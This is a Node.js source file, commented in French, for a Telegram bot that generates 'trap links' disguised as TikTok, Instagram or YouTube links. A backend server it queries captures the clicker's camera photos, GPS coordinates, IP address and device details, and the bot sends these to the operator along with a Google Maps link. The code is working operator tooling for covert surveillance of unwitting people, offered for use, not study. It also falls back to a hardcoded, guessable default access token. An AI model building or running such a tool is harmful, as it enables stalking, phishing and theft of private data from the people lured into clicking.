const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const dotenv = require("dotenv");

// Configuration propre
dotenv.config();

// Réduire les logs verbeux TLS
process.env.NTBA_FIX_319 = 1;
process.env.NTBA_FIX_350 = 1;

// Filtrer les logs encombrants
const originalLog = console.log;
console.log = (...args) => {
    const message = args.join(" ");
    if (
        message.includes("TLSWrap") ||
        message.includes("Symbol(") ||
        message.includes("kBuffer")
    ) {
        return; // Ignorer les logs TLS verbeux
    }
    originalLog.apply(console, args);
};

// Initialisation du bot
const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error("❌ TELEGRAM_BOT_TOKEN manquant dans les Secrets !");
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        autoStart: true,
        params: {
            timeout: 10
        }
    } 
});

// URL de base simplifiée
const BASE_URL = process.env.REPLIT_DOMAINS
    ? `https://${process.env.REPLIT_DOMAINS.split(",")[0]}`
    : (process.env.RENDER_EXTERNAL_URL || `http://localhost:${process.env.PORT || 5000}`);

// 🔐 TOKEN D'AUTHENTIFICATION SÉCURISÉ - IDENTIQUE AU SERVEUR
const crypto = require("crypto");
const DEFAULT_SECURE_TOKEN =
    "secure_default_token_" +
    crypto
        .createHash("sha256")
        .update("replit_telegram_bot_2024")
        .digest("hex");
const authToken =
    process.env.DATA_ACCESS_TOKEN ||
    (() => {
        console.log(
            `⚠️  IMPORTANT: Aucun DATA_ACCESS_TOKEN défini dans l'environnement.`,
        );
        console.log(
            `🔐 Utilisation du token par défaut sécurisé: ${DEFAULT_SECURE_TOKEN.substring(0, 16)}...`,
        );
        console.log(`💡 Bot et serveur utilisent le même token par défaut`);
        return DEFAULT_SECURE_TOKEN;
    })();

console.log(
    `🔐 Token d'authentification chargé depuis l'environnement: ${authToken.substring(0, 8)}...`,
);

console.log(`🤖 Bot Telegram démarré !`);
console.log(`📡 URL de base: ${BASE_URL}`);

// 🎯 COMMANDE /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcome = `🔥 *Bot de Capture de Données Activé !*

🎯 *Commandes disponibles :*
• /generate - Créer un lien piège
• /data [ID] - Voir les données capturées
• /help - Aide

🚀 *Prêt à capturer !*`;

    bot.sendMessage(chatId, welcome, { parse_mode: "Markdown" });
});

// 🎯 COMMANDE /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    const help = `📚 *Guide d'utilisation :*

🔗 *Créer un lien :*
1. Tape /generate
2. Choisis une plateforme
3. Partage le lien généré

📊 *Voir les données :*
1. Tape /data [ID]
2. Ou clique sur le lien dans le message

✨ *Le bot capture automatiquement :*
• 📸 Photos haute résolution
• 📍 Géolocalisation GPS + IP
• 📱 Infos complètes de l'appareil
• 🌐 Données réseau et navigateur`;

    bot.sendMessage(chatId, help, { parse_mode: "Markdown" });
});

// 🎯 GÉNÉRATION DE LIENS
bot.onText(/\/generate/, (msg) => {
    const chatId = msg.chat.id;

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "🎵 TikTok", callback_data: "tiktok" },
                    { text: "📸 Instagram", callback_data: "instagram" },
                ],
                [{ text: "📺 YouTube", callback_data: "youtube" }],
            ],
        },
        parse_mode: "Markdown",
    };

    bot.sendMessage(chatId, "🎯 *Choisis ta plateforme :*", keyboard);
});

// 🎯 GESTION DES BOUTONS (CALLBACK QUERIES)
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const callbackData = query.data;

    // Répondre immédiatement au callback pour éviter les timeouts
    bot.answerCallbackQuery(query.id).catch(() => {});

    try {
        if (callbackData.startsWith("data_")) {
            const linkId = callbackData.replace("data_", "");
            await sendDataById(chatId, linkId);
            return;
        }

        const platform = callbackData;
        const response = await axios.post(`${BASE_URL}/generate-link`, {
            platform,
            chatId,
        });

        const { id, url } = response.data;

        const platformEmojis = {
            tiktok: "🎵",
            instagram: "📸",
            youtube: "📺",
        };

        const message = `${platformEmojis[platform]} *${platform.toUpperCase()} - LIEN PRÊT !*

🎯 *VOICI TON LIEN :*

🔗🔗🔗🔗🔗🔗🔗🔗🔗🔗
${url}
🔗🔗🔗🔗🔗🔗🔗🔗🔗🔗

📋 *COPIE-COLLE CE LIEN ↑↑↑*

🆔 *Code :* \`${id}\`
📊 *Voir données :* /data ${id}

✅ *PRÊT À UTILISER !*
⚡ Les données seront capturées dès le premier clic`;

        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔗 Ouvrir le lien", url: url }],
                    [{ text: "📊 Voir les données", callback_data: `data_${id}` }],
                ],
            },
        };

        bot.sendMessage(chatId, message, {
            parse_mode: "Markdown",
            disable_web_page_preview: true,
            ...keyboard,
        });

        console.log(`🔗 Lien ${platform} généré: ${id} pour chat ${chatId}`);
    } catch (error) {
        console.error("❌ Erreur génération lien:", error.message);
        bot.sendMessage(chatId, "❌ Erreur de génération. Réessaye.");
    }
});

// Fonction helper pour envoyer les données
async function sendDataById(chatId, linkId) {
    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;

        let message = `📊 DONNÉES CAPTURÉES - \`${linkId}\`\n\n`;
        message += `📸 *Photos :* ${data.images?.length || 0}\n`;
        
        if (data.location && data.location.latitude) {
            message += `📍 *Position :* ${data.location.city || ''} ${data.location.country || ''}\n`;
            message += `• Lat: ${data.location.latitude}\n• Lng: ${data.location.longitude}\n`;
        }
        
        if (data.device) {
            message += `📱 *Appareil :* ${data.device.detectedModel || data.device.platform || 'Inconnu'}\n`;
        }

        message += `⏰ *Temps :* ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
        message += `🌐 *IP :* ${data.ip || "N/A"}`;

        await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

        if (data.images && data.images.length > 0) {
            const imageBuffer = Buffer.from(data.images[0], "base64");
            await bot.sendPhoto(chatId, imageBuffer, { caption: `📸 Photo 1/${data.images.length}` });
        }
    } catch (error) {
        bot.sendMessage(chatId, `❌ Aucune donnée pour \`${linkId}\``);
    }
}

// 🎯 COMMANDE /data [ID]
bot.onText(/\/data (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const linkId = match[1].trim();

    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: {
                Authorization: `Bearer ${authToken}`,
            },
        });
        const data = response.data;

        // Construire le message de résultats
        let message = `📊 DONNÉES CAPTURÉES - \`${linkId}\`\n\n`;

        // 📸 Photos
        if (data.images && data.images.length > 0) {
            message += `📸 *Photos :* ${data.images.length} images capturées\n`;
            message += `📐 *Résolution :* Haute qualité\n\n`;
        } else {
            message += `📸 *Photos :* Aucune image capturée\n\n`;
        }

        // 📍 Localisation
        if (data.location && data.location.latitude) {
            message += `📍 *Géolocalisation :*\n`;
            message += `• Lat: ${data.location.latitude}\n`;
            message += `• Lng: ${data.location.longitude}\n`;
            if (data.location.accuracy) {
                message += `• Précision: ${data.location.accuracy}m\n`;
            }
            if (data.location.city) {
                message += `• Ville: ${data.location.city}\n`;
            }
            if (data.location.country) {
                message += `• Pays: ${data.location.country}\n`;
            }
            message += `• Source: ${data.location.source}\n\n`;
        } else {
            message += `📍 *Géolocalisation :* Non disponible\n\n`;
        }

        // 📱 Appareil
        if (data.device) {
            // Afficher le modèle exact en priorité
            if (
                data.device.exactModel &&
                data.device.exactModel !== "Inconnu"
            ) {
                message += `📱 *Modèle :* ${data.device.exactModel}\n`;
            } else if (data.device.platform) {
                message += `📱 *Appareil :* ${data.device.platform}\n`;
            }
            if (data.device.vendor && data.device.vendor !== "Inconnu") {
                message += `🏷️ *Marque :* ${data.device.vendor}\n`;
            }
            if (data.device.screen) {
                message += `📱 *Écran :* ${data.device.screen.width}x${data.device.screen.height}\n`;
            }
            if (data.device.language) {
                message += `🌐 *Langue :* ${data.device.language}\n`;
            }
            message += "\n";
        }

        // ⏰ Timestamp
        const captureTime = new Date(data.timestamp).toLocaleString("fr-FR");
        message += `⏰ *Capturé :* ${captureTime}\n`;
        message += `🌐 *IP :* ${data.ip || "N/A"}`;

        // Envoyer le message principal
        bot.sendMessage(chatId, message, { parse_mode: "Markdown" });

        // Envoyer la première photo si disponible
        if (data.images && data.images.length > 0) {
            try {
                const imageBuffer = Buffer.from(data.images[0], "base64");
                await bot.sendPhoto(chatId, imageBuffer, {
                    caption: `📸 Photo 1/${data.images.length} capturée via ${linkId}`,
                });

                if (data.images.length > 1) {
                    bot.sendMessage(
                        chatId,
                        `📸 **${data.images.length - 1} autres photos disponibles !**\n\n` +
                            `Pour voir toutes les photos, utilise le panneau d'administration ou contacte le développeur.`,
                        { parse_mode: "Markdown" },
                    );
                }
            } catch (photoError) {
                console.error("❌ Erreur envoi photo:", photoError.message);
                bot.sendMessage(
                    chatId,
                    `📸 ${data.images.length} photos capturées (erreur d'affichage)`,
                );
            }
        }

        // Lien Google Maps si géolocalisation disponible
        if (data.location && data.location.latitude) {
            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
            bot.sendMessage(
                chatId,
                `🗺️ **[Voir sur Google Maps](${mapsUrl})**`,
                { parse_mode: "Markdown", disable_web_page_preview: false },
            );
        }

        console.log(`📊 Données consultées pour ${linkId} par chat ${chatId}`);
    } catch (error) {
        if (error.response && error.response.status === 404) {
            bot.sendMessage(
                chatId,
                `❌ **Aucune donnée trouvée pour l'ID :** \`${linkId}\`\n\n` +
                    `💡 **Vérifications :**\n` +
                    `• L'ID est-il correct ?\n` +
                    `• Quelqu'un a-t-il cliqué sur le lien ?\n` +
                    `• Le lien a-t-il été généré récemment ?`,
                { parse_mode: "Markdown" },
            );
        } else {
            console.error("❌ Erreur récupération données:", error.message);
            bot.sendMessage(
                chatId,
                "❌ Erreur lors de la récupération des données. Réessaye plus tard.",
            );
        }
    }
});

// 🎯 GESTION DES ERREURS GLOBALES
bot.on("polling_error", (error) => {
    console.error("❌ Erreur polling:", error.message);
});

bot.on("webhook_error", (error) => {
    console.error("❌ Erreur webhook:", error.message);
});

// Message de confirmation
console.log("✅ Bot Telegram prêt et en écoute !");
